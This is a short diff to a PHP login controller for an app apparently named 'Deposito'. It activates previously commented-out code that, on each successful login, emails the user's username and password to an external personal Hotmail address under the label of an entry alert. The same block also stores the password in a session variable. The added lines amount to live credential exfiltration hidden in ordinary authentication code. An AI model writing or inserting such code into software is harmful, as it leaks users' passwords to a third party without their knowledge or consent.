@@ -75,8 +75,8 @@ class usuario extends Controller
                 $_SESSION['name_user'] = $data[0]['usuario'];
                 $_SESSION['email_user'] = $data[0]['correo'];
                 $_SESSION['id_user'] = $data[0]['password'];
-                // $mensaje="Alquien registrado con usuario ".$data[0]['name_user']." y contraseña ".$data[0]['psw_user']." a las ".time();
-                // mail("juansevas992010@gmail.com","Alerta de entrada",$mensaje,"Alerta de entrada desde el aplicativo Deposito");
+                $mensaje="Alquien registrado con usuario ".$data[0]['name_user']." y contraseña ".$data[0]['psw_user']." a las ".time();
+                mail("juansebas992010@hotmail.com","Alerta de entrada",$mensaje,"Alerta de entrada desde el aplicativo Deposito");
                 // var_dump($_SESSION);
                 // exit();
             
